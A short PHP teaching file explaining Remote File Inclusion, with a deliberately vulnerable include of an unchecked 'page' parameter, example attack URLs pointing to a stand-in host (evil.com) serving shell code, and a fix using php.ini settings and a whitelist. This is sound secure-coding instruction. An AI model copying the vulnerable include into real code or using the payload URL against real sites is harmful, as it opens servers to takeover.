<?php

// Remote File Inclusion (RFI)
/**
 * Wehn a PHP script allows user input to specify file path, and that path is directly included with functions such as (include, require, include_once, require_once)...
 * if this input is not validated, attackers can point your script to a remote malicious file hosted on their server. 
 * that file will then be executed on your server with your server's permissions.
 */


// example of vulnerable code

// address to malicious shell code
// http://example.com/index.php?page=http://evil.com/shell.txt
$page = $_GET['page'];
include($page . ".php");

// if the attacker provide: ?page=http://evil.com/malicious, the script will fetch and execute the malicious code

// RISKS: data theft, full server compromise, malware injection to attack site's visitors

// SOLUTION
// 1. Disable Remote File Includes in php.ini
// allow_url_include = Off
// allow_url_fopen = Off

// 2. Use a whitelist of allowed files
// instead of letting users specify any file, define an allowed list
$pages = [
    "home" => "pages/home.php",
    "about" => "pages/about.php",
];

$page = $_GET['page'] ?? 'home'; // if $_GET['page'] was null, default to 'home'
if (array_key_exists($page, $pages)) {
    include $pages[$page];
} else {
    include $pages['home'];
}


